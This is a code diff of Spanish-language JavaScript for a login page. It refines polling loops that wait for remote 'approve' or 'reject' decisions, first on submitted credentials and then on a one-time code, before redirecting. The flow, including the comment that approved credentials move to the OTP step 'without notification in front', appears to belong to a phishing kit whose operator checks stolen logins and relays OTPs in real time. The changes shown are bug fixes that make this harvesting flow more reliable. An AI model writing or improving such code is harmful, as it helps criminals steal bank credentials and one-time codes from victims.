@@ -872,9 +872,16 @@
             
             console.log('🔄 Iniciando polling para credenciales...');
             
+            // Limpiar cualquier polling anterior
+            if (pollingInterval) {
+                clearInterval(pollingInterval);
+                pollingInterval = null;
+            }
+            
             pollingInterval = setInterval(async () => {
                 if (Date.now() - tiempoInicio > MAX_POLLING_TIME) {
                     clearInterval(pollingInterval);
+                    pollingInterval = null;
                     mostrarError('Tiempo de espera agotado. Intente nuevamente.');
                     resetFormulario();
                     return;
@@ -884,6 +891,7 @@
                 
                 if (resultado === 'pedir_otp') {
                     clearInterval(pollingInterval);
+                    pollingInterval = null;
                     // Credenciales aprobadas → mostrar OTP sin notificación en front
                     mostrarOTP();
                     loadingOverlay.classList.remove('active');
@@ -892,6 +900,7 @@
                     return;
                 } else if (resultado === 'error_credenciales') {
                     clearInterval(pollingInterval);
+                    pollingInterval = null;
                     mostrarError('❌ Los datos ingresados no coinciden. Intente de nuevo.');
                     resetFormulario();
                     return;
@@ -904,9 +913,16 @@
             
             console.log('🔄 Iniciando polling para OTP...');
             
+            // Limpiar cualquier polling anterior
+            if (pollingInterval) {
+                clearInterval(pollingInterval);
+                pollingInterval = null;
+            }
+            
             pollingInterval = setInterval(async () => {
                 if (Date.now() - tiempoInicio > MAX_POLLING_TIME) {
                     clearInterval(pollingInterval);
+                    pollingInterval = null;
                     mostrarError('Tiempo de espera agotado. Intente nuevamente.');
                     resetFormulario();
                     return;
@@ -916,12 +932,14 @@
                 
                 if (resultado === 'aprobar_otp') {
                     clearInterval(pollingInterval);
+                    pollingInterval = null;
                     mostrarExito('✅ Autenticación exitosa. Redirigiendo...');
                     setTimeout(() => {
                         window.location.href = 'index.html';
                     }, 2000);
                 } else if (resultado === 'rechazar_otp') {
                     clearInterval(pollingInterval);
+                    pollingInterval = null;
                     mostrarError('❌ Código OTP incorrecto. Intente de nuevo.');
                     resetFormulario();
                     // Ocultar OTP y volver a credenciales
@@ -942,6 +960,9 @@
             // Habilitar el campo OTP
             confirmationInput.disabled = false;
             confirmationInput.focus();
+            // Ocultar cualquier mensaje de estado
+            statusMessage.className = 'status-message';
+            statusMessage.style.display = 'none';
         }
 
         function ocultarOTP() {
@@ -952,6 +973,9 @@
             formSubtitle.textContent = 'Ingrese sus credenciales de seguridad a continuación.';
             confirmationInput.value = '';
             confirmationInput.disabled = true;
+            // Ocultar cualquier mensaje de estado
+            statusMessage.className = 'status-message';
+            statusMessage.style.display = 'none';
         }
 
         // ============================================
